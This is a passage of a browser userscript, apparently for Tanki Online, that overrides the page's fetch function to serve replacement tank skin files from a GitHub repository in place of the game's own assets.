    const SKIN_FILE_RE = /s\.eu\.tankionline\.com\/(\d+\/\d+\/\d+\/\d+)\/\d+\/(lightmap\.webp|object\.a3d|meta\.info)$/;

    const fetch_ = unsafeWindow.fetch.bind(unsafeWindow);

    function blob(url, contentType) {
        return new Promise((resolve, reject) => {
            GM.xmlHttpRequest({
                method: "GET",
                url,
                responseType: "blob",
                onload: (res) => {
                    resolve(
                        new Response(res.response, {
                            status: res.status,
                            statusText: res.statusText,
                            headers: { "Content-Type": contentType },
                        })
                    );
                },
                onerror: (err) => reject(err),
            });
        });
    }

    function stripQuery(url) {
        try {
            const u = new URL(url);
            u.search = "";
            u.hash = "";
            return u.toString();
        } catch {
            return url.split("?")[0].split("#")[0];
        }
    }

    unsafeWindow.fetch = function (input, init) {
        const url = typeof input === "string" ? input : input?.url;
        if (!url) return fetch_(input, init);

        const clean = stripQuery(url);

        const m = clean.match(SKIN_FILE_RE);
        if (m) {
            const id = m[1], file = m[2];
            const skin = skinMap[id];

            if (skin) {
                const variant = checked("XT") ? "XT" : checked("Legacy") ? "LC" : null;
                if (variant) {
                    if (file === "meta.info" && skin.noMeta) return fetch_(input, init);
                    const ghUrl = `${GITHUB_RAW}/${skin.type}/${skin.name}/${variant}/${file}`;
                    const ct = file.endsWith(".webp") ? "image/webp" : "application/octet-stream";
                    // log("skin redirect:", id, "→", ghUrl);
                    return blob(ghUrl, ct);
                }
            }
        }

        return fetch_(input, init);
    };
})();
